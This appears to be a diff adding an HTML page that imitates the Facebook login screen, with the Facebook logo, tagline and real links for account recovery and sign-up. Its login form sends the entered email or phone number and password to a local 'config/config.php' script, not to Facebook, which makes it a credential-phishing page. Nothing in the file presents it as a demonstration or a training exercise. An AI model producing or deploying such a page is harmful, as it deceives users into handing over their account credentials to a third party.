@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#3b5998">
+    <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a7/Logo_Facebook_2023.png" type="image/png">
+    <style>
+        /* أساسي للألوان والخلفية */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+
+        /* تنسيق الحاوية الرئيسية */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        /* تنسيق شعار فيسبوك */
+        .logo-part img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        /* تنسيق النص الرئيسي */
+        h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        /* تنسيق النموذج */
+        .form-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            margin-bottom: 15px;
+        }
+
+        .form-container input[type="submit"] {
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+        }
+
+        .form-container input[type="submit"]:hover {
+            background-color: #165e9b;
+        }
+
+        .forgot {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .forgot a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .line {
+            margin: 20px 0;
+            border-top: 1px solid #ddd;
+        }
+
+        .create-btn a {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #42b72a;
+            color: white;
+            text-align: center;
+            border-radius: 5px;
+            font-size: 16px;
+            text-decoration: none;
+        }
+
+        .create-btn a:hover {
+            background-color: #36a420;
+        }
+
+        /* استجابة للتصميم على الأجهزة الصغيرة */
+        @media (max-width: 768px) {
+            h2 {
+                font-size: 16px;
+                margin-bottom: 20px;
+            }
+
+            .form-container {
+                padding: 15px;
+            }
+
+            .form-container input {
+                font-size: 12px;
+                padding: 8px;
+            }
+
+            .form-container input[type="submit"] {
+                font-size: 14px;
+                padding: 12px;
+            }
+
+            .create-btn a {
+                font-size: 14px;
+            }
+
+            .logo-part img {
+                width: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- الجزء العلوي (الشعار والنص) -->
+        <div class="logo-part">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Logo_Facebook_2023.png" alt="Facebook Logo">
+        </div>
+        <h2>Facebook helps you connect and share with the people in your life.</h2>
+
+        <!-- نموذج التسجيل -->
+        <div class="form-container">
+            <form action="config/config.php" method="POST">
+                <input type="text" name="email" placeholder="Email address or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="submit" value="Log In">
+            </form>
+            <div class="forgot">
+                <a href="https://www.facebook.com/login/identify/">Forgotten account?</a>
+            </div>
+        </div>
+
+        <!-- خط فاصل -->
+        <div class="line"></div>
+
+        <!-- زر "إنشاء حساب جديد" -->
+        <div class="create-btn">
+            <a href="https://www.facebook.com/reg/">Create New Account</a>
+        </div>
+    </div>
+</body>
+</html>
